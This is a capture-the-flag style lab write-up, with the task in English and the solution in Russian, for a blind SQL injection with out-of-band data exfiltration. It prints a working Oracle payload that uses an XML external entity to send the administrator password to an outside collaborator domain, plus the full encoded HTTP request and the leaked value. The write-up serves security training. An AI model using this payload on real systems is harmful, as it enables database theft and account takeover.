# Blind SQL injection with out-of-band data exfiltration
PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Решение
Беру пейлоад из решения:
```
 UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.9eolwycqlbp0aig71optk2mp0g67u1iq.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
Прогоняю его через URL-encoding и подставляю к значению кукиса `TrackingId` после апострофа:
```
GET /product?productId=2 HTTP/2
Host: 0aeb00a403704423808c0882005b00be.web-security-academy.net
Cookie: TrackingId=O2bNheVZZ6UffvVz'%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%27%7c%7c%28%53%45%4c%45%43%54%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%27%29%7c%7c%27%2e%39%65%6f%6c%77%79%63%71%6c%62%70%30%61%69%67%37%31%6f%70%74%6b%32%6d%70%30%67%36%37%75%31%69%71%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%2d%2d; session=HLjwpNnqu94MAndxVMFkhbVMn0agvCQZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aeb00a403704423808c0882005b00be.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
Через некоторое время в коллаборатор приходит запрос:
```
GET / HTTP/1.0
Host: n2ba3u4dhcbt0r8jx224.9eolwycqlbp0aig71optk2mp0g67u1iq.oastify.com
Content-Type: text/plain; charset=utf-8
```
Логинюсь как administrator:n2ba3u4dhcbt0r8jx224. Задание выполнено.
